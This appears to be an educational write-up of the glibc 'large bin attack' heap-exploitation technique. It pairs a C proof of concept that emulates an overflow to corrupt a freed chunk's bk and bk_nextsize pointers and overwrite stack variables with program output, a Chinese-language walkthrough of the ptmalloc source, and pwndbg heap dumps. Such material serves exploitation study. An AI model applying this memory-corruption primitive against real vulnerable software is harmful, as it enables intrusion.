# large_bin_attack

```c
/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */

#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
 
int main()
{
    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x420);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x500);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x500);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
 
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");
    malloc(0x20);
 
    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

    malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
 
    //------------VULNERABILITY-----------

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);
 
    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    // sanity check
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;
}
```

**result**

```c
This file demonstrates large bin attack by writing a large unsigned long value into stack
In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the targets we want to rewrite on stack:
stack_var1 (0x7ffdc9aa7a40): 0
stack_var2 (0x7ffdc9aa7a48): 0

Now, we allocate the first large chunk on the heap at: 0xec2000
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()

Then, we allocate the second large chunk on the heap at: 0xec2460
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()

Finally, we allocate the third large chunk on the heap at: 0xec29a0
And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()

We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0xec2460 <--> 0xec2000 ]

Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0xec20a0 ]

Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0xec29a0 <--> 0xec20a0 ]

Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers
Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2

Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
stack_var1 (0x7ffdc9aa7a40): 0xec29a0
stack_var2 (0x7ffdc9aa7a48): 0xec29a0
```

**analysis**

首先，申请一个large chunk，p1。申请一个chunk防止第二个large chunk，p2与p1合并。同理，再申请p3。

为了防止与top chunk的合并再申请一个chunk。free p1和p2，它们会被加入到unsorted bin中，这时需要再申请一个大小小于large bin的chunk，第二个p2会被加入到large bin中，其fd_nextsize和bk_nextsize都指向了自身，因为此时p2是chunk头。p1被分割用于满足请求，剩余部分加入到unsorted bin中。

free(p3)，p3被加入到unsorted bin中。现在，假设我们可以通过p1溢出到p2，可以修改p2的bk_nextsize。

修改size为0x3f1，fd为0，bk指向stack_var1 - 0x10，fd_nextsize为0，bk_nextsize指向stack_var2 - 0x20。

malloc(0x90)，

```c
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                  if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size < fwd->size)
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;
```

这段代码，发生在大循环中，因为0x90，在fast bins和small bin中都没有能满足其需求的chunk，所以从unsorted bin中取出最后一个chunk，即被分割后的p1，之后将其加入small bin。然后，又取出p3，其属于large bin。

从large bin中取出p2，由于我们修改了p2的size，所以p3的size大于p2，进入了23行的else分支。在while中，通过fd_nextsize找到比当前size大的chunk，显然没有。所以没有进入循环。最终程序进入了35行的分支。

fwd的bk_nextsize被我们指向了stack_var2 - 0x20，在第40行，fd_nextsize在一个chunk中的偏移是0x20，所以这里将victim即p3的地址写到了stack_var2。

接着，bck = fwd->bk;将stack_var1 - 0x10给了bck。第53行，victim的地址又被写入了stack_var1。至此，large bin attack完成。

large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件：

- 可以修改一个 large bin chunk 的 data
- 从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面

**gdb**

申请p1，p2，p3

```c
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x603430
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x603460
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x603970
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x6039a0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x603eb0
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x603ee0
Size: 0x20121
```

free p1和p2

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603460 —▸ 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603460 /* '`4`' */
smallbins
empty
largebins
empty
```

malloc(0x90)

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6030a0
smallbins
empty
largebins
0x500: 0x603460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x603460 /* '`4`' */
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0xa1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x6030a0
Size: 0x391
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x603430
Size: 0x30

Free chunk (largebins) | PREV_INUSE
Addr: 0x603460
Size: 0x511
fd: 0x7ffff7dd1fa8
bk: 0x7ffff7dd1fa8
fd_nextsize: 0x603460
bk_nextsize: 0x603460

Allocated chunk
Addr: 0x603970
Size: 0x30

Allocated chunk | PREV_INUSE
Addr: 0x6039a0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x603eb0
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x603ee0
Size: 0x20121
```

修改p2

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0xa1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x6030a0
Size: 0x391
fd: 0x7ffff7dd1b78
bk: 0x6039a0

Allocated chunk
Addr: 0x603430
Size: 0x30

Allocated chunk | PREV_INUSE
Addr: 0x603460
Size: 0x3f1

Allocated chunk
Addr: 0x603850
Size: 0x00

pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x6039a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6039a0
smallbins
empty
largebins
0x500 [corrupted]
FD: 0x603460 ◂— 0x0
BK: 0x603460 —▸ 0x7fffffffdc60 ◂— 0x0
```

